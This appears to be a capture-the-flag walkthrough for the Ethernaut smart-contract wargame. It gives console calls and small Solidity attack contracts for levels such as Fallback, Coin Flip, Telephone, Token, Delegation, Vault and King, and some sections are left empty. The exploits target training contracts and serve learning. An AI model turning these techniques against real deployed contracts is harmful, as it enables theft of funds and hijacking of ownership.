# 1. Hello Ethernaut
The instructions ask to call the `info()` method
```
contract.info()
```
We follow the output and call:
```
contract.info1()
```
Then...
```
contract.info2()
```
To get `infoNum`, we call its public getter
```
contract.infoNum()
```
`infoNum()` returns `42` as a BigNumber, so we call `info42()`
```
contract.info42()
```
Following the output again
```
contract.theMethodName()
```
Then...
```
contract.method7123949()
```
To know what is the password, we inspect the contract's ABI
```
contract
```
We call the method `password()`
```
contract.password()
```
We finally pass the output to the `authenticate()` method
```
contract.authenticate("ethernaut0")
```

# 2. Fallback
First of all we need to send the contract an amount that is less than `0.001 ether` in order to make a contribution
```
contract.contribute.sendTransaction({from: player, value: toWei("0.0001")})
```
Afterwards, we send another non-zero amount to become an owner (received by the function `receive()`)
```
contract.sendTransaction({from: player, value: toWei(0.0000001)})
```
We can now withdraw all of the contract's balance using `withdraw()`
```
contract.withdraw()
```

# 3. Fallout
In older Solidity versions, the constructor used to defined with the contract's name.  
So, to claim ownership we call the constructor which is named by mistake `fal1out()` instead of `fallout()` 
```
contract.Fal1out()
```

# 4. Coin Flip
In order to guess the right side, we need to implement the same coin flip generation code then pass the result to the `guess()` function.  
The block time is long enough that the `block.number` doesn't change between function calls.
```Solidity
contract Hack {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function _guess() public view returns(bool){
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    return side;
    
    }

    function attack(address _victim) external {
        bool guess = _guess();
        ICoinFlip(_victim).flip(guess);
    }

}
```


# 5. Telephone
In order to claim ownership, we need to call the `changeOwner()` method using an intermediate contract. This way, the `tx.origin` is going to be `player` and the `msg.sender` is going to be the address of the intermediate contract `Hack`.
```Solidity
contract Hack {

    function attack(address _victim) external {
        ITelephone(_victim).changeOwner(msg.sender);
    }

}
```

# 6. Token
To increase our balance we use the `transfer()` method.  
However, in order to get the maximum of tokens, we need to ensure that our balance is equal to the maximum value of `uint256`. 
In order to get this value, we substract the amount we already have to prevent an overflow.
```Solidity
tokenContract.transfer(msg.sender, type(uint).max - tokenContract.balanceOf(msg.sender)); 
```

# 7. Delegation
```
contract.sendTransaction({from: player, to: this, value:0, data: "0xdd365b8b" })
```


# 8. Force



# 9. Vault
```
web3.eth.getStorageAt(instance, "1")
```

# 10. King
This level consists of a game to claim the King title. Our aim is to break it.  
We notice that the previous king receives `msg.value` using `transfer()` and that the `msg.sender` becomes the king once the transfer is succeeded. But what if this previous king couldn't receive any ether?  
So, in order to break the game, we need to make a contract that can't receive ether, in other words, it doesn't implement a `receive()` nor a `fallabck()` function.
```Solidity
contract Hack{
    address public victim;

    constructor(address _victim){
        victim = _victim;
    }

    function attack() public payable{
        (bool success,) = payable(victim).call{value: msg.value}("");
        require(success);
    }

}
```

# 11. Re-entrancy

